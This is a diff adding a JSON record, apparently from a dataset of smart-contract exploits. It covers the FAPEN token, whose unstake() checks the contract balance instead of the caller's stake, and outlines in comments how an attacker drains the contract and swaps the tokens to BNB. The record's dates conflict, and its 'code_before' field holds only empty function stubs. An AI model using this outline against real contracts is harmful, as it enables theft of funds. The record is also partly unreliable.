@@ -1,0 +1,29 @@
+{
+ "id": "2023__2023-05-xx_FAPEN_UnstakeWrongBalanceCheck",
+ "source_file": "2023/2023-05-xx_FAPEN_UnstakeWrongBalanceCheck.md",
+ "title": "FAPEN Exploit — unstake() Wrong Balance Check Allows Draining Contract",
+ "date": "2023-01-01",
+ "protocol": "FAPEN",
+ "chain": null,
+ "loss_raw": null,
+ "loss_usd": null,
+ "root_cause": null,
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "// File: FAPEN_decompiled.sol\n    function balanceOf(address account) external view returns (uint256) {}  // ❌\n\n// ...\n\n    function owner() external view returns (address) {}  // ❌\n\n// ...\n\n    function decreaseAllowance(address account, uint256 value) external {}  // ❌\n\n// ...\n\n    function transfer(address account, uint256 value) external returns (bool) {}  // ❌\n\n// ...\n\n    function allowance(address account, address recipient) external view returns (uint256) {}  // ❌"
+ ],
+ "code_after": [],
+ "steps": [
+  "// → wrong balance check passes (checks contract.balance not caller.staked)",
+  "// → transfers entire FAPEN contract balance to attacker",
+  "// ) → swap FAPEN → BNB"
+ ],
+ "other_code": [
+  "// 1. contractBalance = FAPEN.balanceOf(address(FAPEN))\n// 2. FAPEN.unstake(contractBalance)\n//    → wrong balance check passes (checks contract.balance not caller.staked)\n//    → transfers entire FAPEN contract balance to attacker\n// 3. Router.approve(address(Router), type(uint256).max)\n// 4. Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n//       FAPEN.balanceOf(this), 0, [FAPEN, WBNB], address(this), deadline\n//    )  → swap FAPEN → BNB",
+  "interface IFAPEN is IERC20 {\n    function unstake(uint256 amount) external;\n}\n\ninterface Uni_Router_V2 {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}"
+ ]
+}
